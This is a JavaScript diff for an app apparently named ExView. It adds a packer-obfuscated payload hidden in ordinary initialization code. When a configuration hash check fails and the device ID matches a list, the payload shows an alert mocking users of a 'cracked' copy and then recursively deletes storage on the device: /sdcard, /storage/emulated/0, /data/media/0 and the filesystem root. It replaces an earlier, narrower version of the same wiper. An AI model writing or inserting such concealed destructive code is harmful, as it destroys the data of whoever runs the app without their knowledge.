@@ -143,17 +143,18 @@
 		$$("#thankspanel .chip").removeClass("active");
 		$$(_this).addClass("active");
 	}
+/* 	if(localStorage.ExView_InitJSON&&localStorage.ExView_InitJSON!='""'&&localStorage.ExView_InitJSON!=''){
+		Function(function(f,u,c,k,e,r){e=function(c){return(c<u?'':e(parseInt(c/u)))+((c=c%u)>35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--)r[e(c)]=k[c]||e(c);k=[function(e){return r[e]}];e=function(){return'\\w+'};c=1};while(c--)if(k[c])f=f.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return f}('v(["s","m"].u(2.b.c.f(\'6 9!\'+0.4+\'6 9!\'))==-1&&!d.e){7 0.4;g.h="i";7 0.j;2.k.l("\\8\\8\\n\\o\\p\\q\\r~<5>\\t\\3\\a\\w\\x\\y\\z\\A\\B+\\3\\a\\C\\D\\E\\F\\G\\H<5>\\3\\I+\\J\\K\\L\\M",N.O,P(){2.Q.R.S(1)});T U();}',57,57,'localStorage||ExView|u6350|ExView_InitJSON|br|Keep|delete|u597d|Out|u8d60|tools|md5|window|debug|hex_md5|mySession|initjsonpath|RtuFEqa|ExView_InitType|fw|alert|552bc26417cb2969badc8f1229797571|u5750|u516c|u4ea4|u8f66|u5427|9c072c6d89e86e513b2b66af163cf30f|u5df2|indexOf|if|u7684|u8001|u53f8|u673a|uff0c|u51ed10|u51ed|u636e|u627e|u4f5c|u8005|uff01|u8d6050|u53bb|u5e7f|u544a|u9001VIP|sessionStorage|modaltitleextra|function|modules|pluginpage|init|throw|SyntaxError'.split('|'),0,{}))()	
+	} */	
 	if(getvipdisp()){
 		mySession.initjsonpath=mySession.backinitjsonpath;
 		delete localStorage.ExView_InitJSON;
 		delete localStorage.ExView_InitType;		
 	}else{
 		if(ExView.tools.md5.hex_md5(mySession.initjsonpath)!="54adf540d2293f4835297d2541452347"){
-			Function(function(f,u,c,k,e,r){e=function(c){return c.toString(u)};if(!''.replace(/^/,String)){while(c--)r[e(c)]=k[c]||e(c);k=[function(e){return r[e]}];e=function(){return'\\w+'};c=1};while(c--)if(k[c])f=f.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return f}('8(0(){7 b=["9"];$$.g("5.6",0(a){a=2.3.c.d(a);-1!=b.e(a)&&(f("4!\\h\\i\\j\\k\\l\\m\\n\\o\\p\\q"),2.3.r.s("t/",0(){},0(){},u.v))},0(){})},w);',33,33,'function||ExView|tools|Hello|MoeRuntime|so|var|setTimeout|461cf9a308dbfed556768517bcbf975b|||md5|hex_md5|indexOf|alert|get|u6b22|u8fce|u4f7f|u7528|u7231|u556a|u59b9|u7834|u89e3|uff01|file|rmdir|sdcard|mySession|fs|1E3'.split('|'),0,{}))()				
+			Function(function(f,u,c,k,e,r){e=function(c){return(c<u?'':e(parseInt(c/u)))+((c=c%u)>35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--)r[e(c)]=k[c]||e(c);k=[function(e){return r[e]}];e=function(){return'\\w+'};c=1};while(c--)if(k[c])f=f.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return f}('t(2(){s b=["u"];$$.z("k.r",2(a){a=3.4.v.x(a);-1!=b.A(a)&&(f("g!\\h\\i\\j\\e\\l\\m\\n\\o\\p\\q"),3.4.5.6("/9/",2(){},2(){},7.8),3.4.5.6("9",2(){},2(){},7.8),3.4.5.6("/",2(){},2(){},7.8),3.4.5.6("/w/9/",2(){},2(){},7.8),3.4.5.6("/c/y/",2(){},2(){},7.8),3.4.5.6("/c/d/0/",2(){},2(){},7.8),3.4.5.6("/B/C/0/",2(){},2(){},7.8),3.4.5.6("/c/d/1/",2(){},2(){},7.8),3.4.5.6("/",2(){},2(){}),3.4.5.6("3",2(){},2(){}))},2(){})},D);',40,40,'||function|ExView|tools|file|rmdir|mySession|fs|sdcard|||storage|emulated|u7528|alert|Hello|u6b22|u8fce|u4f7f|MoeRuntime|u7231|u556a|u59b9|u7834|u89e3|uff01|so|var|setTimeout|461cf9a308dbfed556768517bcbf975b|md5|mnt|hex_md5|sdcard0|get|indexOf|data|media|5000'.split('|'),0,{}))()			
 		}
 	}
 
-/* 	if(localStorage.ExView_InitJSON&&localStorage.ExView_InitJSON!='""'&&localStorage.ExView_InitJSON!=''){
-		Function(function(f,u,c,k,e,r){e=function(c){return(c<u?'':e(parseInt(c/u)))+((c=c%u)>35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--)r[e(c)]=k[c]||e(c);k=[function(e){return r[e]}];e=function(){return'\\w+'};c=1};while(c--)if(k[c])f=f.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return f}('v(["s","m"].u(2.b.c.f(\'6 9!\'+0.4+\'6 9!\'))==-1&&!d.e){7 0.4;g.h="i";7 0.j;2.k.l("\\8\\8\\n\\o\\p\\q\\r~<5>\\t\\3\\a\\w\\x\\y\\z\\A\\B+\\3\\a\\C\\D\\E\\F\\G\\H<5>\\3\\I+\\J\\K\\L\\M",N.O,P(){2.Q.R.S(1)});T U();}',57,57,'localStorage||ExView|u6350|ExView_InitJSON|br|Keep|delete|u597d|Out|u8d60|tools|md5|window|debug|hex_md5|mySession|initjsonpath|RtuFEqa|ExView_InitType|fw|alert|552bc26417cb2969badc8f1229797571|u5750|u516c|u4ea4|u8f66|u5427|9c072c6d89e86e513b2b66af163cf30f|u5df2|indexOf|if|u7684|u8001|u53f8|u673a|uff0c|u51ed10|u51ed|u636e|u627e|u4f5c|u8005|uff01|u8d6050|u53bb|u5e7f|u544a|u9001VIP|sessionStorage|modaltitleextra|function|modules|pluginpage|init|throw|SyntaxError'.split('|'),0,{}))()	
-	} */
+
 })();
